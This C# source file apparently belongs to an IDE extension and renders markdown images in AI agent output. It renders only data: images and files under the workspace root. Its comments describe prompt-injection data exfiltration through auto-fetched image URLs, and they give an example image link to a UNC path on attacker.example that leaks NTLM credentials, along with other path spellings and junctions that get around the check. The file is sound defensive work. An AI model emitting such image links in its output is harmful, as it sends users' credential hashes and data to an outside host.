using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Controls;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using CodeWicket.Core.Ide;

namespace CodeWicket.UI.Markdown
{
    /// <summary>
    /// Inline markdown images, with a deliberate source policy: <c>data:image/...</c> URIs and
    /// files UNDER THE WORKSPACE ROOT are rendered; anything else is NOT fetched. Auto-fetching
    /// http(s) images from agent output is a classic prompt-injection exfiltration channel (data
    /// smuggled out in the query string of a URL the client fetches automatically), so remote images
    /// stay as alt-text hyperlinks the user can choose to open — consistent with the renderer's
    /// link-scheme guard. Decoded bitmaps are frozen and cached so the per-delta document rebuild
    /// never re-decodes.
    /// <para><b>"Local" is a containment, not a scheme (pre-release security review, September 2026).</b> The scheme guard
    /// below refused http(s) and let every <c>file:</c> URI and every rooted path through - and a
    /// UNC path is rooted. So <c>![](\\attacker.example\s\p.png)</c>, or the same host behind
    /// <c>file://</c>, was opened by <c>FileInfo.Exists</c> on the dispatcher with no gesture: Windows
    /// authenticated to the named host first (the NetNTLMv2 response, offered for cracking or relay,
    /// and a beacon that the message rendered), and the SMB timeout held devenv's UI thread while it
    /// did. Enumerating the remote spellings is the wrong shape - <c>\\?\UNC\</c>, device paths,
    /// percent-encoding, a <c>file://host/</c> that <c>LocalPath</c> turns back into <c>\\host\</c> -
    /// so the rule is positive instead: a file renders only when <see cref="WorkspacePath.IsUnderRoot"/>
    /// places its full path inside the workspace root, the same test <see cref="FileReferenceResolver"/>
    /// already applies to every path the agent names. A caller with no root renders no file at all.
    /// The decode stays synchronous and on the dispatcher deliberately: what made it hang was a
    /// remote volume, which containment excludes, and the off-thread rework the finding also asked
    /// for was twice measured to cost more than it bought (a decode-to-render loop, then permanent
    /// eviction of images on screen).</para>
    /// </summary>
    internal static class MarkdownImages
    {
        // data: payloads are capped (base64 chars ≈ 4/3 of bytes); local files are capped on disk
        // size. Neither bounds worst-case MEMORY - a PNG of uniform pixels decodes to hundreds of
        // times its size - which is ImageDecodeBudget's job (pre-release security review, September 2026).
        private const int MaxDataUriChars = 3 * 1024 * 1024;
        private const long MaxLocalFileBytes = 8 * 1024 * 1024;
        private const int MaxCacheEntries = 32;

        /// <summary>
        /// The longest edge an image is decoded at. Applied to WHICHEVER edge overshoots it more, so
        /// a tall image is bounded as well as a wide one - before the budget only width was ever scaled, and
        /// a tall narrow image decoded at its full height however far under the budget it was.
        /// </summary>
        internal const int MaxDecodeEdge = 960;

        // UI-thread only (the renderer runs on the Dispatcher). Failures cache as null so a bad
        // source isn't re-probed on every streamed delta.
        private static readonly Dictionary<string, BitmapSource?> Cache = new Dictionary<string, BitmapSource?>();

        /// <summary>
        /// Tries to build a themable Image element for a markdown image source. Returns null for
        /// remote/disallowed/undecodable sources (caller falls back to alt text).
        /// </summary>
        /// <param name="workspaceRoot">
        /// The only directory a file source may be read from. Null renders no file source - a
        /// <c>data:</c> image still renders - because there is nothing to contain a path against.
        /// </param>
        public static Image? TryCreateImage(string? url, string? workspaceRoot)
        {
            if (string.IsNullOrEmpty(url))
                return null;

            var source = GetOrDecode(url!, workspaceRoot);
            if (source == null)
                return null;

            return new Image
            {
                Source = source,
                Stretch = Stretch.Uniform,
                // DownOnly: shrink big images to the caps, never upscale a small one blurry.
                StretchDirection = StretchDirection.DownOnly,
                MaxWidth = 480,
                MaxHeight = 320,
            };
        }

        private static BitmapSource? GetOrDecode(string url, string? workspaceRoot)
        {
            // The root is part of the key: the same file source is inside one workspace and outside
            // the next, and a solution switch must not inherit the old answer either way.
            var key = (workspaceRoot ?? string.Empty) + "\n" + url;
            if (Cache.TryGetValue(key, out var cached))
                return cached;

            BitmapSource? decoded;
            try
            {
                decoded = Decode(url, workspaceRoot);
            }
            catch
            {
                // Malformed base64, unreadable file, unsupported codec, ... — alt-text fallback.
                decoded = null;
            }

            if (Cache.Count >= MaxCacheEntries)
                Cache.Clear();
            Cache[key] = decoded;
            return decoded;
        }

        private static BitmapSource? Decode(string url, string? workspaceRoot)
        {
            if (url.StartsWith("data:image/", StringComparison.OrdinalIgnoreCase))
            {
                var comma = url.IndexOf(',');
                if (comma < 0 || url.Length - comma - 1 > MaxDataUriChars)
                    return null;
                if (url.IndexOf(";base64,", StringComparison.OrdinalIgnoreCase) < 0)
                    return null;
                var bytes = Convert.FromBase64String(url.Substring(comma + 1));
                using (var stream = new MemoryStream(bytes))
                    return DecodeStream(stream);
            }

            var path = TryResolveLocalPath(url, workspaceRoot);
            if (path == null)
                return null;
            // Containment is lexical up to here, and a link is what makes a lexical answer wrong
            // (pre-release security review, September 2026): a junction inside the root naming a UNC share passes the
            // spelling test, and the Exists below would follow it to the host - the handshake and
            // the stall the containment excludes, one clone with symlinks on away. Every component
            // below the root is asked whether it is a link, by an API that reads the entry and
            // never its target, BEFORE anything opens it. Refused, not followed.
            if (ReparsePoints.AnyBelow(workspaceRoot!, path))
                return null;
            var info = new FileInfo(path);
            if (!info.Exists || info.Length > MaxLocalFileBytes)
                return null;
            using (var stream = File.OpenRead(path))
                return DecodeStream(stream);
        }

        /// <summary>
        /// The full path of a file source that lies under <paramref name="workspaceRoot"/>, or null:
        /// for a remote scheme, a relative path, a source outside the root - a UNC host, a sibling
        /// directory, a <c>..</c> that climbs out - or no root to contain it against. Pure: nothing
        /// here touches the file system, so a refused source is never stat'd, let alone opened.
        /// </summary>
        internal static string? TryResolveLocalPath(string url, string? workspaceRoot)
        {
            // Accept file: URIs and absolute local paths. Relative paths are ambiguous (the UI
            // process cwd is not the workspace) and remote schemes are the caller's fallback.
            string? candidate = null;
            if (Uri.TryCreate(url, UriKind.Absolute, out var uri))
            {
                if (uri.Scheme == Uri.UriSchemeFile)
                    candidate = uri.LocalPath;
                else if (uri.Scheme.Length > 1)
                    return null; // http/https/etc — never fetched here (single letters are drive roots)
            }
            candidate ??= Path.IsPathRooted(url) ? url : null;
            if (candidate is null)
                return null;

            // Containment, and the ONLY test of locality: IsUnderRoot normalises the candidate
            // (GetFullPath folds `..`, keeps a `\\?\` or UNC prefix as the different prefix it is)
            // and requires the root plus a separator as a prefix, so a sibling directory sharing the
            // root's spelling does not pass either. A malformed path answers false, not throws.
            string full;
            try
            {
                full = Path.GetFullPath(candidate);
            }
            catch (Exception e) when (e is ArgumentException || e is NotSupportedException || e is PathTooLongException)
            {
                return null;
            }
            return WorkspacePath.IsUnderRoot(full, workspaceRoot) ? full : null;
        }

        private static BitmapSource? DecodeStream(Stream stream)
        {
            // The header first, and the DECODED size is what it is judged on (pre-release
            // security review): a frame over the pixel budget is refused before a pixel of it exists. The
            // encoded-size caps above cannot do this job - PNG's compression of uniform pixels
            // makes a sub-megabyte file that decodes to gigabytes.
            if (!ImageDecodeBudget.TryProbe(stream, out var naturalWidth, out var naturalHeight))
                return null;

            var image = new BitmapImage();
            image.BeginInit();
            image.CacheOption = BitmapCacheOption.OnLoad; // fully decode now; releases the stream/file
            image.StreamSource = stream;
            // Scale the edge that overshoots MORE, and only that one - WPF keeps the aspect ratio
            // when a single decode dimension is set, and setting both would distort. Applied only
            // when it actually shrinks (setting it unconditionally would upscale-decode small images).
            var widthOvershoot = naturalWidth / (double)MaxDecodeEdge;
            var heightOvershoot = naturalHeight / (double)MaxDecodeEdge;
            if (widthOvershoot > 1 && widthOvershoot >= heightOvershoot)
                image.DecodePixelWidth = MaxDecodeEdge;
            else if (heightOvershoot > 1)
                image.DecodePixelHeight = MaxDecodeEdge;
            image.EndInit();
            image.Freeze();
            return image;
        }
    }
}
